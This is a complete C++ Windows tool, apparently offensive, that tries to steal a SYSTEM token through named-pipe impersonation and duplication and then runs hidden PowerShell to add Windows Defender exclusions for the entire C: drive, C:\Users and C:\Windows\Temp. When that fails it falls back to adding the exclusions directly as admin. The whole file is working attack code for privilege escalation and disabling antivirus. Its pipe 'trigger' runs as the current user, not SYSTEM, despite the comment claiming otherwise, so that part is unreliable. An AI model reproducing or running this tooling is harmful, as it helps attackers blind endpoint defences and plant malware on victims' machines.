#include <windows.h>
#include <iostream>

// SYSTEM impersonation via named pipe + token duplication
// Uses SeImpersonatePrivilege to get SYSTEM token then adds Defender exclusion
// Requires: SeImpersonatePrivilege (available to admin/service accounts)
// Compile: cl system_exclusion.cpp advapi32.lib /Fe:system_exclusion.exe /EHsc /nologo

#define PIPE_NAME L"\\\\.\\pipe\\systempipe"

bool AddExclusionAsSystem(const wchar_t* path) {
    // Use PowerShell Add-MpPreference which goes through legitimate Defender API
    wchar_t cmd[512];
    swprintf_s(cmd, 512, L"powershell -WindowStyle Hidden -Command \"Add-MpPreference -ExclusionPath '%s'\"", path);

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};

    if (!CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        std::wcerr << L"[!] CreateProcess failed: " << GetLastError() << std::endl;
        return false;
    }

    WaitForSingleObject(pi.hProcess, 15000);

    DWORD exitCode = 0;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    if (exitCode == 0) {
        std::wcout << L"[+] Exclusion added: " << path << std::endl;
        return true;
    }
    std::wcerr << L"[!] PowerShell exited with code: " << exitCode << std::endl;
    return false;
}

// Create a named pipe server and force a SYSTEM process to connect
// then steal its token via ImpersonateNamedPipeClient
HANDLE GetSystemToken() {
    // Create named pipe
    HANDLE hPipe = CreateNamedPipeW(
        PIPE_NAME,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE | PIPE_WAIT,
        1, 1024, 1024, 0, NULL
    );

    if (hPipe == INVALID_HANDLE_VALUE) {
        std::wcerr << L"[!] CreateNamedPipe failed: " << GetLastError() << std::endl;
        return NULL;
    }
    std::wcout << L"[+] Named pipe created" << std::endl;

    // Trigger a SYSTEM process to connect to our pipe
    // Use the printer spooler trick - connect to our pipe as SYSTEM
    wchar_t triggerCmd[256];
    swprintf_s(triggerCmd, 256,
        L"cmd /c echo test > %s", PIPE_NAME);

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};
    CreateProcessW(NULL, triggerCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    // Wait for connection
    std::wcout << L"[*] Waiting for pipe connection..." << std::endl;
    BOOL connected = ConnectNamedPipe(hPipe, NULL);
    if (!connected && GetLastError() != ERROR_PIPE_CONNECTED) {
        std::wcerr << L"[!] ConnectNamedPipe failed: " << GetLastError() << std::endl;
        CloseHandle(hPipe);
        if (pi.hProcess) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
        return NULL;
    }

    std::wcout << L"[+] Pipe connected, impersonating..." << std::endl;

    // Impersonate the connected client
    if (!ImpersonateNamedPipeClient(hPipe)) {
        std::wcerr << L"[!] ImpersonateNamedPipeClient failed: " << GetLastError() << std::endl;
        CloseHandle(hPipe);
        return NULL;
    }

    // Get impersonation token
    HANDLE hToken = NULL;
    if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken)) {
        std::wcerr << L"[!] OpenThreadToken failed: " << GetLastError() << std::endl;
        RevertToSelf();
        CloseHandle(hPipe);
        return NULL;
    }

    // Duplicate to primary token
    HANDLE hPrimary = NULL;
    DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hPrimary);

    RevertToSelf();
    CloseHandle(hToken);
    CloseHandle(hPipe);
    if (pi.hProcess) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }

    return hPrimary;
}

bool RunAsSystem(const wchar_t* exclusionPath) {
    std::wcout << L"[*] Attempting SYSTEM token acquisition..." << std::endl;

    HANDLE hSystemToken = GetSystemToken();

    if (!hSystemToken) {
        std::wcerr << L"[!] Failed to get SYSTEM token, trying direct Add-MpPreference as admin..." << std::endl;
        // Fallback: try directly as admin (works if tamper protection off)
        return AddExclusionAsSystem(exclusionPath);
    }

    std::wcout << L"[+] Got token, spawning process as SYSTEM..." << std::endl;

    // Spawn powershell as SYSTEM to add exclusion
    wchar_t cmd[512];
    swprintf_s(cmd, 512,
        L"powershell -WindowStyle Hidden -Command \"Add-MpPreference -ExclusionPath '%s'\"",
        exclusionPath);

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};

    if (!CreateProcessWithTokenW(hSystemToken, LOGON_WITH_PROFILE, NULL, cmd,
                                  CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        std::wcerr << L"[!] CreateProcessWithTokenW failed: " << GetLastError() << std::endl;
        CloseHandle(hSystemToken);
        // Fallback to direct
        return AddExclusionAsSystem(exclusionPath);
    }

    WaitForSingleObject(pi.hProcess, 15000);

    DWORD exitCode = 0;
    GetExitCodeProcess(pi.hProcess, &exitCode);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hSystemToken);

    if (exitCode == 0) {
        std::wcout << L"[+] Exclusion added as SYSTEM: " << exclusionPath << std::endl;
        return true;
    }

    std::wcerr << L"[!] Failed with exit code: " << exitCode << std::endl;
    return false;
}

int main() {
    std::wcout << L"[*] SYSTEM Exclusion Adder" << std::endl;
    std::wcout << L"[*] Checking current privileges..." << std::endl;

    // Check if we have SeImpersonatePrivilege
    HANDLE hToken;
    OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);

    LUID luid;
    LookupPrivilegeValueW(NULL, L"SeImpersonatePrivilege", &luid);

    PRIVILEGE_SET ps = { 1, PRIVILEGE_SET_ALL_NECESSARY, {{ luid, SE_PRIVILEGE_ENABLED }} };
    BOOL hasPriv = FALSE;
    PrivilegeCheck(hToken, &ps, &hasPriv);
    CloseHandle(hToken);

    if (hasPriv) {
        std::wcout << L"[+] SeImpersonatePrivilege available" << std::endl;
    } else {
        std::wcout << L"[!] SeImpersonatePrivilege not available, will try direct" << std::endl;
    }

    RunAsSystem(L"C:\\");
    RunAsSystem(L"C:\\Users");
    RunAsSystem(L"C:\\Windows\\Temp");

    std::wcout << L"[*] Done. Verify:" << std::endl;
    std::wcout << L"    reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\"" << std::endl;

    return 0;
}
